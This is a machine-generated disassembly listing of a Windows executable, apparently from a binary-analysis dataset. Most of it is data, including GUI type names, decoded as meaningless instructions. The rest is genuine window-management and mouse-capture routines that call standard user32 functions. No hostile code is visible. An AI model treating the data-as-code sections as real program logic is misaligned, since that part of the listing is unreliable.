dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pushfd
and eax [ eax + eax + 0x8 ]
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
adc al 0x23
inc esp
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x25 ] bl
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x442314c0 ] cl
sub al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ edx + ecx * 4 + 0x6c380044 ] dl
add al bl
jbe r-xdata
inc ecx
add [ eax ] al
adc al 0x6c
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc esp
add [ eax + 0x2000446c ] ah
pop ebp
inc esp
add [ esp + ebp * 2 + 0xe0044 ] cl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x1540040 ] ch
add [ eax ] al
dec ebx
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add [ eax ] bh
insb
add [ eax - 0x57ffbb89 ] ch
pop edx
inc esp
add ah ch
popad
inc esp
add [ eax + 0x61 ] dl
inc esp
add [ eax + 0x6a ] bh
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add al bl
jns r-xdata
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ ebx + edi * 2 + 0x44 ] ch
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
jo r-xdata
add [ esp + ebp * 2 ] dl
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add al dl
push edi
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
test [ edx ] ah
inc esp
add [ eax ] cl
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add cl [ eax ]
add cl [ edx ]
lea eax [ eax ]
mov ah 0x24
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x25 ] al
inc esp
add [ edi ] ch
inc esp
add [ eax ] al
jbe r-xdata
add [ esi ] bl
daa
inc esp
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add al dl
push edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
adc [ esp + eax * 2 ] ah
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx + ebx * 2 ] bh
inc esp
add [ eax + ecx * 4 + 0x44 ] cl
add [ esp + edi * 2 + 0x44 ] al
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax + 0x4c00445b ] ah
inc esp
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
pop eax
inc esp
add ah bl
jbe r-xdata
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_442835
pushad
inc esp
add [ edi + eax * 4 + 0x44 ] dh
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ eax + 0x29 ] al
inc esp
add [ eax + eax ] ah
add [ eax ] al
cmp [ ecx ] bl
inc esp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
jns r-xdata
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x295cc08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x29 ] bl
inc esp
adc [ edx ] al
enter 0x4456 0x0
xor [ ecx ] dl
inc edx
add [ edi + edx * 2 + 0x44 ] dh
add [ eax + 0x14004210 ] al
adc [ edx ] eax
push 0xb4004211
push ebp
inc esp
add [ eax ] ah
inc ebp
inc esp
add ah bh
outsd
jb r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
xor al [ eax ]
and al 0x32
inc eax
add al cl
adc [ edx ] al
dec esp
lea eax [ eax + eax - 0x4 ]
inc eax
call 0x584469ae
add [ eax ] eax
dec esp
pushad
inc esp
add [ edi + eax * 4 + 0x44 ] dh
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + ebp ] dl
inc esp
add [ esi ] al
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add [ eax ] cl
xor al 0x40
outsd
outsb
je r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
sub al [ eax + eax + 0x3 ]
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ edx + ebp + 0x44 ] bl
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
sub al [ eax + eax + 0x6 ]
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
add [ eax ] ch
push esi
inc esp
add [ ecx + edx ] dl
inc edx
add [ eax + 0x11 ] ch
inc edx
add [ ebp + edx * 2 + 0x2e200044 ] dh
inc ebp
js r-xdata
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
sub al [ eax + eax + 0x6 ]
add [ eax ] al
insb
inc ebp
jae r-xdata
push edx
or [ fs : edx + 0x76 ] ah
add [ edx + ebp + 0x44 ] ebx
add [ ebx + 0x442abcc0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600442a ] bh
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ eax + 0x2e ] cl
inc ebp
add [ eax - 0x73 ] dh
inc esp
add [ eax + 0x5c004457 ] ah
push esi
inc esp
add [ eax - 0x53ffbad2 ] bl
inc ebp
add [ esi + edx * 2 + 0x2ed40044 ] dl
inc ebp
add al dh
push esi
inc esp
add ah bl
inc ebp
add [ eax ] dl
push edi
inc esp
add ah ah
inc ebp
add [ eax - 0x73 ] bh
inc esp
add [ eax + ebx * 2 ] al
inc esp
add [ eax + ebx * 2 + 0x44 ] al
add [ eax ] dh
push edi
inc esp
add al bh
inc ebp
add ah bh
inc ebp
add [ edi + edx * 2 + 0x44 ] dl
add ah al
push esp
inc esp
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
sub [ esi + 0x44 ] dl
les ebp [ eax ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ eax + eax - 0x75 ]
sar [ edx + ebp + 0xa030044 ] 0x54
inc edx
jbe r-xdata
pop esp
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
shr ah 0x29
inc esp
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add ah bl
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
cld
sub [ eax + eax + 0x1 ] eax
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
pushad
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
sub al 0x44
outsd
insb
jae r-xdata
mov eax eax
add [ ebx ] ch
outsb
je r-xdata
inc ebx
outsd
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
or [ ebp - 0x297fffbc ] 0x44
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
add ah bl
or al 0x42
outsd
insb
jae r-xdata
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
rol [ eax ] 0x2b
add [ edx + eax ] al
add [ eax ] al
push 0xdc004424
inc esp
insb
push edi
add dl dh
inc esp
add [ eax ] al
add [ eax ] al
pushad
sub al 0x44
add [ edi + ebp ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2c ] bh
inc esp
add bh bh
[ eax + 0x442b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c ] ah
inc esp
sub_442b17
rcr [ ebx + ebp ] 0x44
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add ah bl
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
or [ ebp - 0x297fffbc ] 0x44
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
add ah bl
or al 0x42
outsd
insb
jae r-xdata
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add [ eax ] al
add [ eax ] al
pushad
sub al 0x44
add [ edi + ebp ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2c ] bh
inc esp
add dl dh
inc esp
add [ edx + eax ] al
add [ eax ] al
push 0xdc004424
add bh bh
[ eax + 0x442b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c ] ah
inc esp
sub_442c22
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add al ah
sahf
inc esp
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_442d44
mov eax 0xb6ffb7ff
push [ ebp - 0x1b004b01 ]
mov cl 0x44
add [ ebx + esi * 4 + 0x44 ] al
add [ ebx + esi * 4 + 0x44 ] ah
add [ eax - 0x27ffbb4d ] cl
mov bl 0x44
add al bh
mov bl 0x44
add [ eax ] bl
mov ah 0x44
add [ esp + esi * 4 ] bh
inc esp
add [ eax - 0x4c ] ah
inc esp
add [ esp + esi * 4 - 0x4b57ffbc ] al
inc esp
add [ eax ] dh
mov ch 0x44
add al dh
mov ch 0x44
add [ eax - 0x4a ] al
inc esp
add [ esi + esi * 4 + 0x44 ] dh
add [ eax + 0x100044b6 ] cl
mov edi 0xbf3c0044
inc esp
add al bh
mov edi 0xc0180044
inc esp
add [ eax + eax * 8 - 0x3e73ffbc ] bh
inc esp
add [ edx + eax * 8 ] dh
inc esp
add [ edx + eax * 8 + 0x44 ] dl
add [ eax - 0x57ffbb3e ] cl
retn 0x44
sub_442dc8
inc esp
add [ eax - 0x5bffbb3d ] bl
mov bl 0x44
add [ eax - 0x37ffbb4d ] bh
mov bl 0x44
add [ eax - 0x63ffbb49 ] cl
mov bh 0x44
add [ eax - 0x3bffbb49 ] dh
mov bh 0x44
add [ ecx + 0x44 ] dl
add [ eax - 0x43ffbb3c ] ch
les eax [ eax + eax - 0x30 ]
les eax [ eax + eax - 0x28 ]
les eax [ eax + eax - 0x20 ]
les eax [ eax + eax - 0x18 ]
les eax [ eax + eax + 0x40 ]
lds eax [ eax + eax - 0x78 ]
lds eax [ eax + eax - 0x50 ]
lds eax [ eax + eax + 0x2c ]
mov [ eax + eax - 0x14 ] 0xc5
inc esp
add [ esi + eax * 8 + 0x44 ] ch
add [ esi + eax * 8 - 0x3ae7ffbc ] ch
inc esp
add [ eax + 0x80044c3 ] bh
les eax [ eax + eax + 0x7c ]
les eax [ eax + eax - 0x78 ]
les eax [ eax + eax - 0x14 ]
mov [ eax + eax + 0x7c ] 0xc7
inc esp
add ah dh
mov [ eax + eax - 0x4 ] 0xc6
inc esp
add [ edi + eax * 8 ] al
inc esp
add [ edi + eax * 8 ] cl
inc esp
add [ eax + ecx * 8 ] ch
inc esp
add [ eax ] dl
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] ah
add [ eax + 0xc0044c9 ] dh
0x44
sub_44311e
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add al ah
sahf
inc esp
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 - 0x1da3ffbc ] al
inc esp
add ah ah
int3
sub_44327a
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x1c ] dl
inc esp
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 - 0x1da3ffbc ] al
inc esp
add ah ah
int3
sub_443324
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
xor eax [ eax + eax + 0x28 ]
add [ eax ] al
add al bl
adc [ eax ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_443415
xor eax [ eax + eax - 0x2 ]
xor eax [ eax + eax + 0x8 ]
xor al 0x44
add [ ecx + 0x33 ] bh
inc esp
add [ ecx - 0x76ffbbcd ] al
xor eax [ eax + eax - 0x6f ]
xor eax [ eax + eax - 0x62 ]
xor eax [ eax + eax - 0x55 ]
xor eax [ eax + eax - 0x48 ]
xor eax [ eax + eax - 0x3b ]
xor eax [ eax + eax - 0x2e ]
xor eax [ eax + eax - 0x21 ]
xor eax [ eax + eax - 0x14 ]
xor eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x3414e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x4c004434 ] bh
xor al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
xor al 0x44
add [ eax ] bh
add [ eax ] al
int3
sub_443558
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_443610
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_443644
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044a8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_443610
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_4436a0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_443884
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c314
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404508
mov eax edi
mov edx esi
call sub_40403c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4438c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c314
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404508
mov eax edi
mov edx esi
call sub_40403c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443934
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
mov eax ebx
call sub_44d054
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_4439e0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_418550
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_443a14
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d054
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_443a3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026f4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_443a14
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_4439e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4183f4
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4185cc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443a98
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418428
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418550
mov edx 0x8
call sub_402714
inc esi
dec ebx
jne r-xdata
sub_443acc
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_418550
mov edi [ eax ]
jmp r-xdata
test edi edi
